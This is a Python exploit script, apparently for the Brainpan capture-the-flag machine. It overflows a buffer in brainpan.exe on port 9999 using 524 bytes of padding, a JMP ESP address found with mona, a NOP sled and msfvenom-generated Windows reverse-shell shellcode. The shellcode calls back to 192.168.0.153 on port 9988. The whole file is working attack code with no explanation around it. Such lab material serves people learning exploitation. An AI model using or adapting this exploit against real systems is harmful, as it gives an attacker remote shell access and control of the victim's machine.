#!/usr/bin/python
import socket
import sys

junk = "A" * 524
#character length to EIP register

eip = "\xf3\x12\x17\x31"
#!mona module
#!mona find -s JMP ESP -m brainpan.exe
#311712f3 brainpan.exe JMP ESP

nops = "\x90" * 20
#nops ;)

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.153 LPORT=9988 EXITFUNC=thread -f c -b "\x00"
shell = ("\xb8\x9c\x74\x52\xcf\xdd\xc4\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x83\xc3\x04\x03\xdf\x7a\xb0\x3a\x23\x6a\xb6"
"\xc5\xdb\x6b\xd7\x4c\x3e\x5a\xd7\x2b\x4b\xcd\xe7\x38\x19\xe2"
"\x8c\x6d\x89\x71\xe0\xb9\xbe\x32\x4f\x9c\xf1\xc3\xfc\xdc\x90"
"\x47\xff\x30\x72\x79\x30\x45\x73\xbe\x2d\xa4\x21\x17\x39\x1b"
"\xd5\x1c\x77\xa0\x5e\x6e\x99\xa0\x83\x27\x98\x81\x12\x33\xc3"
"\x01\x95\x90\x7f\x08\x8d\xf5\xba\xc2\x26\xcd\x31\xd5\xee\x1f"
"\xb9\x7a\xcf\xaf\x48\x82\x08\x17\xb3\xf1\x60\x6b\x4e\x02\xb7"
"\x11\x94\x87\x23\xb1\x5f\x3f\x8f\x43\xb3\xa6\x44\x4f\x78\xac"
"\x02\x4c\x7f\x61\x39\x68\xf4\x84\xed\xf8\x4e\xa3\x29\xa0\x15"
"\xca\x68\x0c\xfb\xf3\x6a\xef\xa4\x51\xe1\x02\xb0\xeb\xa8\x4a"
"\x75\xc6\x52\x8b\x11\x51\x21\xb9\xbe\xc9\xad\xf1\x37\xd4\x2a"
"\xf5\x6d\xa0\xa4\x08\x8e\xd1\xed\xce\xda\x81\x85\xe7\x62\x4a"
"\x55\x07\xb7\xdd\x05\xa7\x68\x9e\xf5\x07\xd9\x76\x1f\x88\x06"
"\x66\x20\x42\x2f\x0d\xdb\x05\x90\x7a\xe3\x4c\x78\x79\xe3\x49"
"\x7d\xf4\x05\xff\x6d\x50\x9e\x68\x17\xf9\x54\x08\xd8\xd7\x11"
"\x0a\x52\xd4\xe6\xc5\x93\x91\xf4\xb2\x53\xec\xa6\x15\x6b\xda"
"\xce\xfa\xfe\x81\x0e\x74\xe3\x1d\x59\xd1\xd5\x57\x0f\xcf\x4c"
"\xce\x2d\x12\x08\x29\xf5\xc9\xe9\xb4\xf4\x9c\x56\x93\xe6\x58"
"\x56\x9f\x52\x35\x01\x49\x0c\xf3\xfb\x3b\xe6\xad\x50\x92\x6e"
"\x2b\x9b\x25\xe8\x34\xf6\xd3\x14\x84\xaf\xa5\x2b\x29\x38\x22"
"\x54\x57\xd8\xcd\x8f\xd3\xf8\x2f\x05\x2e\x91\xe9\xcc\x93\xfc"
"\x09\x3b\xd7\xf8\x89\xc9\xa8\xfe\x92\xb8\xad\xbb\x14\x51\xdc"
"\xd4\xf0\x55\x73\xd4\xd0")
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connet = s.connect((sys.argv[1], 9999))
#                   ^arguement of IP address for brainPan machine
s.recv(1024)
s.send(junk + eip + nops + shell)
